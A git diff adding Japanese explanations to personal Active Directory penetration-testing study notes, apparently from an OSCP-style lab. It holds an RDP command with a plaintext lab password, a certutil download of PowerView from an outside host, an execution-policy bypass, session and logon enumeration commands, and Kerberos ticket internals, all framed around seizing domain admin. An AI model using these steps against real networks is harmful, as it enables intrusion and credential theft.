@@ -16,7 +16,12 @@ xfreerdp /u:sqlServer /p:shantewhite /v:10.11.1.121
 (Domain-Name = USERDOMAIN, USERNAME = Windows-Users-Name)
 
 ## Show Domain-Controller's Name And Domain-Name
+
+現在ログインし ているユーザの Domain オブジェクトを取得。
+
 ```powershell [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()```
+
+`Name`プロパティが「ドメイン名」、`PdcRoleOwner`が「プライマリドメインコントローラ名」。
 
 
 # Users And Groups
@@ -40,19 +45,31 @@ xfreerdp /u:sqlServer /p:shantewhite /v:10.11.1.121
 
 # Curret Logged In Users And Active Sessions
 
+> NetWkstaUserEnum API を使用して Windows 10 クライアントマシン上のローカルユーザを列挙し、NetSessionEnum を使用し てドメインコントローラ上のユーザのアクティブセッションを列挙します。
+
 (certutil -URLcache -f http://192.168.119.160/PowerView.ps1 PowerView.ps1)
 
 ```PS> powershell -ep bypass Import-Module .\PowerView.ps1```
 
-(Computer name "client251", `hostname` command tells you your computer name)
-
 ## Show Current Logged In Users
+
+まず、Get-NetLoggedon でログインユーザを列挙する際に、対象となるワークステーショ ンやサーバを指定するために-ComputerName オプションを使います。ここでは Windows 10 クライアントを対象としているので、-ComputerName client251 とします。
+
+(Computer name "client251", `hostname` command tells you your computer name)
 
 ```PS> Get-NetLoggedon -ComputerName client251```
 
 ## Show All Activated Sessions
 
-```PS> Get-NetSession -ComputerName dc01  (Probably, dc01 is Doamin Controller (it's ok not to specify "dc01"))```
+ドメインコントローラ DC01 上のアクティブなセッションを取得してみましょう。
+
+```PS> Get-NetSession -ComputerName dc01```
+
+ (Probably, dc01 is Doamin Controller (it's ok not to specify "dc01"))
+
+（Domain Admins の一人を侵害することに成功すれば、最終的にはドメイン全体を乗っ取ることができます)
+
+> グループメンバーシップを列挙し、ユーザが現在ログインしているマシンを特定できるよ うになったので、ユーザアカウント侵害を開始するために必要な基本スキルを身につける ことができました。最終目的はドメイン管理者権限の獲得です。
 
 
 # LSASS Attack
@@ -166,6 +183,33 @@ Open the PowerShell, execute on PowerShell.
 - Download the password file with weak passwords.
 - Test each password against all active user accounts, except privileged user accounts (admincount=1).
 - Output script progress/status information to console.
+
+# Kerberos認証
+## AS_REQ
+- タイムスタンプ
+- ユーザ名
+（ユーザのハッシュで暗号化）
+
+## AS_REP
+- セッションキー①（ユーザのパスワードハッシュで暗号化）
+- TGT（KDCのみが知っている秘密鍵（= **krbtgtというドメインユーザアカウントのパスワードハッシュ**）で暗号化）
+
+（TGTにはグループメンバーシップ、ドメイン、タイム スタンプ、クライアントの IP アドレス、セッションキー①等が含まれる）
+
+ここまでで、クライアント認証が完了。  次に「サービスチケット」を得る。
+
+## TGS_REQ
+- ユーザ名、タイムスタンプ（セッションキー①で暗号化）、リソースのSPN
+- TGT（KDCのみが知っている秘密鍵（＝krbtgtのパスワードハッシュ）で暗号化）
+
+## TGS_REP
+- サービスチケット（その中にはセッションキー②）
+
+##AP_REQ
+- ユーザ名、タイムスタンプ（セッションキー②で暗号化）
+- サービスチケット
+
+
 
 # Lateral Movement~
 ## Pass The Hash
